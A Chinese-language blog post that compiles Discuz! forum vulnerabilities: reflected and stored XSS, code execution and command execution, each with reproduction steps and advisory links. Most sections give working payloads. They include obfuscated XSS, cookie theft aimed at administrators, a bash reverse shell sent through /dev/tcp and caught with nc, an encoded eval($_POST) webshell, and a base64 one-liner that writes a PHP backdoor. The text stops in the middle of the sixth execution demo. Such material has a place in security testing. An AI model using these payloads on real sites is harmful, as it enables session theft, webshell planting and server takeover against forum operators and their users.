<h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p><strong>漏洞描述：跨站脚本攻击漏洞，恶意攻击者往web页面插入恶意脚本代码，而程序对于用户输入内容未过滤，当用户浏览该页之时，嵌入其中web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。窃取cookie、放蠕虫、网站钓鱼……</strong>。涉及URL如下：</p>
<p>##&#x2F;include&#x2F;global.func.php—&gt;演示1</p>
<p><a href="http://ip/admincp.php?infloat=yes&amp;handlekey=123">http://ip/admincp.php?infloat=yes&amp;handlekey=123</a></p>
<p><a href="http://ip/logging.php?infloat=yes&amp;handlekey=123">http://ip/logging.php?infloat=yes&amp;handlekey=123</a></p>
<p><a href="http://ip/api/uchome.php?infloat=yes&amp;handlekey=123">http://ip/api/uchome.php?infloat=yes&amp;handlekey=123</a></p>
<p>##logging.php—&gt;演示2</p>
<p><a href="http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer">http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer</a>&#x3D;</p>
<p>##source&#x2F;function&#x2F;function_core.php—&gt;演示3</p>
<p><a href="http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/">http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/</a></p>
<p><a href="http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/">http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/</a></p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有3个功能或插件存在反射型XSS</p>
<h3 id="演示1：Discuz-7-2-反射型xss漏洞1"><a href="#演示1：Discuz-7-2-反射型xss漏洞1" class="headerlink" title="演示1：Discuz 7.2 反射型xss漏洞1"></a>演示1：Discuz 7.2 反射型xss漏洞1</h3><p>访问以下链接即可触发XSS：</p>
<p><a href="http://ip/admincp.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/admincp.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a><br><a href="http://ip/logging.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/logging.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a><br><a href="http://ip/api/uchome.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/api/uchome.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a></p>
<p>参考链接：<a href="http://www.bubuko.com/infodetail-2094064.html">http://www.bubuko.com/infodetail-2094064.html</a></p>
<h3 id="演示2：Discuz-7-2-反射型xss漏洞2"><a href="#演示2：Discuz-7-2-反射型xss漏洞2" class="headerlink" title="演示2：Discuz 7.2 反射型xss漏洞2"></a>演示2：Discuz 7.2 反射型xss漏洞2</h3><p>访问如下链接即可触发</p>
<p><a href="http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer=%27-alert(document.domain)-">http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer=%27-alert%28document.domain%29-</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d57b73372148026c6028251ddc12ef7c.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-89252">https://www.seebug.org/vuldb/ssvid-89252</a></p>
<h3 id="演示3：Disucz-X3-2-多处反射型XSS漏洞"><a href="#演示3：Disucz-X3-2-多处反射型XSS漏洞" class="headerlink" title="演示3：Disucz X3.2 多处反射型XSS漏洞"></a>演示3：Disucz X3.2 多处反射型XSS漏洞</h3><p><a href="http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/">http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/</a></p>
<p><a href="http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/">http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/</a></p>
<p>以上链接的referer参数存在XSS漏洞，访问如上链接可查看HTML</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b9188996d2c703cc4eef76d4c40540dc.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9477cbf714cb2776e884a98262745922.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93719">https://www.seebug.org/vuldb/ssvid-93719</a></p>
<h2 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h2><p><strong>漏洞描述：</strong>攻击者可指定任意用户的会话session等会话校验字符串。攻击者可以轻松指定任意用户的session，待诱导用户登录之后，直接使用此session登录用户账号。多常见于此类字段存在于url登录地址中的情况。涉及URL如下：</p>
<p>##直播功能-&gt;演示1</p>
<p>##发帖&#x2F;回复-编辑功能-&gt;演示2</p>
<p>##链接格子插件-&gt;演示3</p>
<p>##添加链接处（如发帖时可添加链接）-&gt;演示4</p>
<p>##后台禁言处-&gt;演示5</p>
<p>##上传附件处-&gt;演示6</p>
<p>##抢楼-奖励楼层处-&gt;演示7</p>
<p>##添加视频处-&gt;演示8</p>
<p>##发表日志处-&gt;演示9</p>
<p>##头像设置处-&gt;演示10</p>
<p>##个人签名处-&gt;演示11</p>
<p>##discuz7.x发帖回帖处-&gt;演示12</p>
<p>## trade.php-&gt;演示13</p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有13个功能或插件存在反射型XSS</p>
<h3 id="演示1：Discuz-3-0-3-2版本的通杀xss存储漏洞（需开始直播功能）"><a href="#演示1：Discuz-3-0-3-2版本的通杀xss存储漏洞（需开始直播功能）" class="headerlink" title="演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）"></a>演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）</h3><p>discuz3.0-3.2有个功能叫直播的。实习版主就能开启哈~<br>接着咱们就用admin帐号先把一个帖子弄成直播！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/58408e5396ca116e16614a9b1601e894.png" class>

<p>先把payload进行base16编码（如果不拦截，直接上原始payload）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/281d7fb89a658cff5a42b07217026d24.png" class>

<p>在直播发帖处进行发表</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5cc92bcad46824d7e41f06de5116aeb4.png" class>

<p>弹窗~</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1f16610a47e54f4cc664d28a18009681.png" class>

<p>参考链接：</p>
<p><a href="https://www.secpulse.com/archives/33389.html">https://www.secpulse.com/archives/33389.html</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93716">https://www.seebug.org/vuldb/ssvid-93716</a></p>
<h3 id="演示2：全版本存储型（4-0版本之前，建议测试全版本）XSS及其绕过："><a href="#演示2：全版本存储型（4-0版本之前，建议测试全版本）XSS及其绕过：" class="headerlink" title="演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过："></a>演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过：</h3><p>此处演示绕过：在发帖或回复处添加“[email]2”onmouseover&#x3D;”alert(2)[&#x2F;email]”</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/2192718863ecc37e99869241f451f578.png" class>

<p>然后对帖子或者评论进行编辑时，与页面进行一定交互时即可触发 XSS：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/933da97c673d2b6b86e5a9beb7a82ebf.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ac627b1480f42a10d09faa7840daa07c.png" class>

<p>参考链接：</p>
<p><a href="http://0day5.com/archives/3323/">http://0day5.com/archives/3323/</a></p>
<p>20150609补丁绕过：<a href="http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/">http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/</a></p>
<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=139851">https://bugs.shuimugan.com/bug/view?bug_no=139851</a></p>
<h3 id="演示3：Discuz-链接格子插件-v2-5-1-存储型-XSS-漏洞"><a href="#演示3：Discuz-链接格子插件-v2-5-1-存储型-XSS-漏洞" class="headerlink" title="演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞"></a>演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞</h3><p>在论坛自助购买广告位处，在“文字内容中”填写”&gt;&lt;img&#x2F;src&#x3D;1&#x2F;&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0a1d28d7afb2ed43aef928c51971b5b6.png" class>

<p>在管理后台-应用-自助广告位可发现弹出窗口</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9272dfb415c08bb154c70dad8f506bb3.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-90006">https://www.seebug.org/vuldb/ssvid-90006</a></p>
<h3 id="演示4：Discuz-x2-x2-5-x3-0-x3-1-x3-2-XSS直打管理员"><a href="#演示4：Discuz-x2-x2-5-x3-0-x3-1-x3-2-XSS直打管理员" class="headerlink" title="演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员"></a>演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员</h3><p>在添加链接处，如添加友链或发帖内容填写友链处。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/841d5c2797f52d13ec241c760a420b06.png" class>

<p>添加xss代码</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/674987aa9589354b68b27a937e94b9e3.png" class>

<p>等管理员审核的时候获取到cookie</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/284a885c94357c2a6a88414d3296b872.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93713">https://www.seebug.org/vuldb/ssvid-93713</a></p>
<h3 id="演示5：Discuz-X2-5后台禁言xss"><a href="#演示5：Discuz-X2-5后台禁言xss" class="headerlink" title="演示5：Discuz! X2.5后台禁言xss"></a>演示5：Discuz! X2.5后台禁言xss</h3><p>在论坛首页管理 禁止用户那 输入你能管理的用户名称 然后选择禁言 理由那插入payload</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9ed50fd51c80d44b30d1b346fd2cef76.png" class>

<p>漏洞证明</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b32950a12dcb7fb8188dc1dc80af34c6.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93645">https://www.seebug.org/vuldb/ssvid-93645</a></p>
<h3 id="演示6：Discuz-附件解析漏洞导致XSS"><a href="#演示6：Discuz-附件解析漏洞导致XSS" class="headerlink" title="演示6：Discuz!附件解析漏洞导致XSS"></a>演示6：Discuz!附件解析漏洞导致XSS</h3><p>先新建一个php文件，写入XSS代码：&lt;img src&#x3D;1 onerror&#x3D;alert(document.cookie)&gt;</p>
<p>然后保存再将它的后缀名字改成.rar，然后上传附件。点击附件下载，提示即将下：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/68a8742a947fff02992951aa0cac2316.png" class>

<p>右键审查元素得到一个类似下面这样附件的地址（这里不是直接在帖子中得到地址而是通过下载提示之后）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3ad2d67da7ddda9a1debbcf85297ab27.png" class>

<p>在地址后添加一段：-request-文件名.php.html，如下：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8a939e7d6a3e0c9ac4914baea21cd08c.png" class>

<p>当作html执行，XSS代码被触发！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f98ab82c6ad15ee808a9ca7d8c1e3901.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93631">https://www.seebug.org/vuldb/ssvid-93631</a></p>
<h3 id="演示7：DiscuzX3-1-x2F-X3-x2F-X2-5-x2F-X2-抢楼存在存储型XSS"><a href="#演示7：DiscuzX3-1-x2F-X3-x2F-X2-5-x2F-X2-抢楼存在存储型XSS" class="headerlink" title="演示7：DiscuzX3.1&#x2F;X3&#x2F;X2.5&#x2F;X2 抢楼存在存储型XSS"></a>演示7：DiscuzX3.1&#x2F;X3&#x2F;X2.5&#x2F;X2 抢楼存在存储型XSS</h3><p>在抢楼-奖励楼层处添加payload</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/bacf4d3c7ada780dd70336aa196f1f6e.png" class>

<p>完成后触发xss</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a2f59445cab6af38a983487f3dc6f5f2.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93620">https://www.seebug.org/vuldb/ssvid-93620</a></p>
<h3 id="演示8：Ucenter-Home-2-0及以下存储型XSS"><a href="#演示8：Ucenter-Home-2-0及以下存储型XSS" class="headerlink" title="演示8：Ucenter Home 2.0及以下存储型XSS"></a>演示8：Ucenter Home 2.0及以下存储型XSS</h3><p>在插入视频处，如发帖处的插入视频，设置如下payload: [flash]http:&#x2F;&#x2F;“<br>onmouseover&#x3D;’document.body.innerHTML&#x3D;String.fromCharCode(60,105,102,114,97,109,101,47,111,110,108,111,97,100,61,39,106,97,118,97,115,99,114,105,112,116,58,119,114,105,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,54,48,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,51,50,44,49,49,53,44,49,49,52,44,57,57,44,54,49,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,49,49,54,44,49,48,57,44,49,50,48,44,49,48,55,44,52,54,44,49,49,49,44,49,49,52,44,49,48,51,44,52,55,44,49,49,51,44,52,54,44,49,48,54,44,49,49,53,44,54,50,44,54,48,44,52,55,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,54,50,41,41,39,62)’[&#x2F;flash]</p>
<p>完成后弹窗</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d2b13fa78846d28742ffa82191b67c04.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93654">https://www.seebug.org/vuldb/ssvid-93654</a></p>
<h3 id="演示9：Discuz-X2-5最新版本-日志功能存在XSS漏洞"><a href="#演示9：Discuz-X2-5最新版本-日志功能存在XSS漏洞" class="headerlink" title="演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞"></a>演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞</h3><p>在发表日志内容处添加XSS代码</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/458c96f71cf70ad50ab21933475bd6f5.png" class>

<p>完成后触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/62054f437d9ba49e73fd2678d1fdb77e.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93665">https://www.seebug.org/vuldb/ssvid-93665</a></p>
<h3 id="演示10：Discuz-4-0-头像设置处可以持久型脚本"><a href="#演示10：Discuz-4-0-头像设置处可以持久型脚本" class="headerlink" title="演示10：Discuz 4.0 头像设置处可以持久型脚本"></a>演示10：Discuz 4.0 头像设置处可以持久型脚本</h3><p>头像设置处，先选一个系统自带头像，提交，抓包。<br>将头像地址“customavatars&#x2F;190.jpg”替换为xss脚本“javascript:alert(&#x2F;大家新年快乐啊！&#x2F;)”（此处会过滤&lt;,”,’），post提交后，触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1638f9cf5984633cb55be99ae37d7eaf.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93680">https://www.seebug.org/vuldb/ssvid-93680</a></p>
<h3 id="演示11：Discuz-所有版本永久型跨站漏洞"><a href="#演示11：Discuz-所有版本永久型跨站漏洞" class="headerlink" title="演示11：Discuz! 所有版本永久型跨站漏洞"></a>演示11：Discuz! 所有版本永久型跨站漏洞</h3><p>个人中心里的“个人签名”没有对恶意代码进行检测，在 Discuz! 及 img<br>代码禁用的情况下仍可写入恶意代码，Discuz! 会保存并执行该代码，形成永久型跨站。</p>
<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-19342">https://www.seebug.org/vuldb/ssvid-19342</a></p>
<h3 id="演示12：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit"><a href="#演示12：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit" class="headerlink" title="演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)"></a>演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)</h3><p>在发帖或回帖处设置内容为“[audio]javascript:alert(document.cookie)&#x2F;&#x2F;.wav[&#x2F;audio]”，触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/79652e8ad632488906454b64322138ad.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/665eee7215f51a735d8959e74ed6878f.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93737">https://www.seebug.org/vuldb/ssvid-93737</a></p>
<h3 id="演示13：Discuz-trade-php-数据库’注射’-bug"><a href="#演示13：Discuz-trade-php-数据库’注射’-bug" class="headerlink" title="演示13：Discuz! trade.php 数据库’注射’ bug"></a>演示13：Discuz! trade.php 数据库’注射’ bug</h3><p>问题在trade,php中，找到类似于如下请求包，设置目录以及message参数中的payload（注意：一定是199个A）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/919047631672b116dcfdc4d117dda1ac.png" class>

<p>之后会执行XSS。</p>
<p>参考链接：<a href="http://h2016.blog.163.com/blog/static/100863425200810413817385/">http://h2016.blog.163.com/blog/static/100863425200810413817385/</a></p>
<h2 id="命令-x2F-代码执行漏洞"><a href="#命令-x2F-代码执行漏洞" class="headerlink" title="命令&#x2F;代码执行漏洞"></a>命令&#x2F;代码执行漏洞</h2><p><strong>漏洞描述：</strong>Discuz组件中有部分功能代码未对用户的输入进行很好的过滤，导致可植入系统命令或代码到服务器执行。涉及URL如下：</p>
<p>##管理后台-站长-数据库-数据库备份-&gt;演示1</p>
<p>##文件上传-预览-&gt;演示2</p>
<p>##Discuz6.x，7.x任何帖子有表情的地方-&gt;演示3</p>
<p>##convert插件-&#x2F;config.inc.php-&gt;演示4</p>
<p><a href="http://ip/utility/convert/index.php?a=config&amp;source=d7.2_x2.0">http://ip/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</a></p>
<p>##发表日志-添加网络图片处-&gt;演示5</p>
<p>##管理后台-全局-网站第三方统计代码-&gt;演示6</p>
<p>## misc.php -&gt;演示7</p>
<p>[<a href="http://ip/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb%5D(http://ip/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb)%5D=">http://ip/misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b](http://ip/misc.php?action=imme_binding&amp;response%5bresult%5d=aa:b&amp;scriptlang%5baa%5d%5bb)]=</a></p>
<p>## admin\runwizard.inc.php-&gt;演示8</p>
<p><a href="http://ip/bbs/admincp.php?action=runwizard&amp;step=3">http://ip/bbs/admincp.php?action=runwizard&amp;step=3</a></p>
<p>##管理后台-站长-Ucenter设置-设置UcenterIP处-&gt;演示9</p>
<p>##管理后台-已启用插件-接口信息-App key处-&gt;演示10</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：Discuz-1-5-2-5-后台命令执行漏洞-CVE-2018-14729"><a href="#演示1：Discuz-1-5-2-5-后台命令执行漏洞-CVE-2018-14729" class="headerlink" title="演示1：Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)"></a>演示1：<a href="https://www.seebug.org/vuldb/ssvid-97510">Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)</a></h3><p>在管理后台-站长-数据库-备份中选择好要备份的表、数据和备份的方式</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0127f7d9b485fd26befaa068cc25e541.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5630b2c719e066f4a53d2f8b0f04345a.png" class>

<p>提交，使用burpsuit抓包，修改customtables[] &#x3D; pre_common_admincp_cmenu”&gt;aaa;<br>echo ‘&lt;?php phpinfo(); ?&gt;‘ &gt; phpinfo.php #</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4834856099a86c61967e688328376b56.png" class>

<p>成功</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/075d029eef73169b67670ec70ba0fa82.png" class>

<p>参考链接：</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-97510">https://www.seebug.org/vuldb/ssvid-97510</a></p>
<p><a href="https://www.anquanke.com/post/id/158270">https://www.anquanke.com/post/id/158270</a></p>
<h3 id="演示2：Discuz-X2-5-x2F-source-x2F-class-x2F-class-image-php-命令执行漏洞"><a href="#演示2：Discuz-X2-5-x2F-source-x2F-class-x2F-class-image-php-命令执行漏洞" class="headerlink" title="演示2：Discuz X2.5 &#x2F;source&#x2F;class&#x2F;class_image.php 命令执行漏洞"></a>演示2：Discuz X2.5 &#x2F;source&#x2F;class&#x2F;class_image.php 命令执行漏洞</h3><p>在发贴上传附件，上传图片附近，预览抓包修改为以下链接</p>
<p>GET&#x2F;dzx25&#x2F;forum.php?mod&#x3D;image&amp;aid&#x3D;1&amp;size&#x3D;|bash%20i%20&gt;%26%20&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888%200&gt;%261|x300&amp;key&#x3D;68b54146d9d1bfb2ebb38f44f2427454&amp;nocache&#x3D;yes&amp;type&#x3D;1&amp;ramdom&#x3D;xfie9</p>
<p>使用nc命令监听本地8888端口，成功获取到反弹的shell</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1b5db641a4ce869bce72c5e2b8b24531.png" class>

<p>参考链接：<a href="http://0day5.com/archives/2846/">http://0day5.com/archives/2846/</a></p>
<h3 id="演示3：Discuz-6-x-x2F-7-x-x2F-include-x2F-discuzcode-func-php-代码执行漏洞"><a href="#演示3：Discuz-6-x-x2F-7-x-x2F-include-x2F-discuzcode-func-php-代码执行漏洞" class="headerlink" title="演示3：Discuz 6.x&#x2F;7.x &#x2F;include&#x2F;discuzcode.func.php 代码执行漏洞"></a>演示3：Discuz 6.x&#x2F;7.x &#x2F;include&#x2F;discuzcode.func.php 代码执行漏洞</h3><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page=1">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
<p>1GLOBALS[_DCACHE][smilies][searcharray]&#x3D;&#x2F;.*&#x2F;eui;GLOBALS[_DCACHE][smilies][replacearray]&#x3D;phpinfo();</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/44db579c2e436453ee8e8ff8091ce1bf.png" class>

<p>参考链接：</p>
<p><a href="https://www.cnblogs.com/milantgh/p/4199432.html">https://www.cnblogs.com/milantgh/p/4199432.html</a></p>
<p><a href="http://sh4d0w.lofter.com/post/1cb55ec4_2d35857">http://sh4d0w.lofter.com/post/1cb55ec4_2d35857</a></p>
<p><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></p>
<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=80723">https://bugs.shuimugan.com/bug/view?bug_no=80723</a></p>
<h3 id="演示4：Discuz-x3-1-convert插件代码执行漏洞"><a href="#演示4：Discuz-x3-1-convert插件代码执行漏洞" class="headerlink" title="演示4：Discuz! x3.1 convert插件代码执行漏洞"></a>演示4：Discuz! x3.1 convert插件代码执行漏洞</h3><p>在该链接下：<a href="http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&amp;source=d7.2_x2.0">http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</a></p>
<p>发送如下POST请求包(设置newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));&#x2F;&#x2F;]&#x3D;aaaa)。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/45da2778bfe46d99a095dfbaf2374c4a.png" class>

<p>菜刀连接地址<a href="http://www.test.ichunqiu/utility/convert/data/config.inc.php">www.test.ichunqiu/utility/convert/data/config.inc.php</a> 密码c</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a88ca737f9449c8b2dbb711f9ab4e966.png" class>

<p>参考链接：</p>
<p><a href="https://bbs.ichunqiu.com/thread-1909-1-1.html">https://bbs.ichunqiu.com/thread-1909-1-1.html</a></p>
<p><a href="https://www.webshell.cc/4664.html">https://www.webshell.cc/4664.html</a></p>
<h3 id="演示5：Discuz-X2-5-远程代码执行漏洞"><a href="#演示5：Discuz-X2-5-远程代码执行漏洞" class="headerlink" title="演示5：Discuz! X2.5 远程代码执行漏洞"></a>演示5：Discuz! X2.5 远程代码执行漏洞</h3><p>a.注册任意账户。</p>
<p>b.登陆用户，发表blog日志（注意是日志）。</p>
<p>c.添加图片，选择网络图片，地址{${fputs(fopen(base64_decode(ZGVtby5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}}</p>
<p>d.访问日志，论坛根目录下生成demo.php，一句话密码：c。</p>
<p>参考链接：<a href="http://www.freebuf.com/vuls/329.html">http://www.freebuf.com/vuls/329.html</a></p>
<h3 id="演示6：Discuz-X3-1后台任意代码执行可拿shell"><a href="#演示6：Discuz-X3-1后台任意代码执行可拿shell" class="headerlink" title="演示6：Discuz! X3.1后台任意代码执行可拿shell"></a>演示6：Discuz! X3.1后台任意代码执行可拿shell</h3><p>全局–〉网站第三方统计代码–〉插入php代码,如插入 &lt;?php phpinfo();?&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5764594c6c1d33fa895f301cb0737c09.png" class>

<p>工具–〉更新缓存[为了保险起见，更新下系统缓存]：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10295133e9efc1552d01446c06909401.png" class>

<p>门户–&gt; HTML管理–〉设置：1）静态文件扩展名[一定要设置成htm] ：htm<br>2)专题HTML存放目录: template&#x2F;default&#x2F;portal 3)设置完，提交吧！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/083437f5c83273d4fa237839514db0f4.png" class>

<p>门户–〉专题管理–〉创建专题：1）专题标题：xyz 2）静态化名称：portal_topic_222<br>&#x2F;&#x2F;222为自定义文件名，自己要记住 3）附加内容：选择上：站点尾部信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5775ab219249324b0fc04ebb5950145c.png" class>

<p>提交,回到门户–〉专题管理,把刚才创建的专题开启，如下图</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ebfc8b8b2bfc3bc65ba0e44d730d66c4.png" class>

<p>把刚才的专题，生成<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/add9c63ef2233ef0e42538763bc7ba6d.png" class></p>
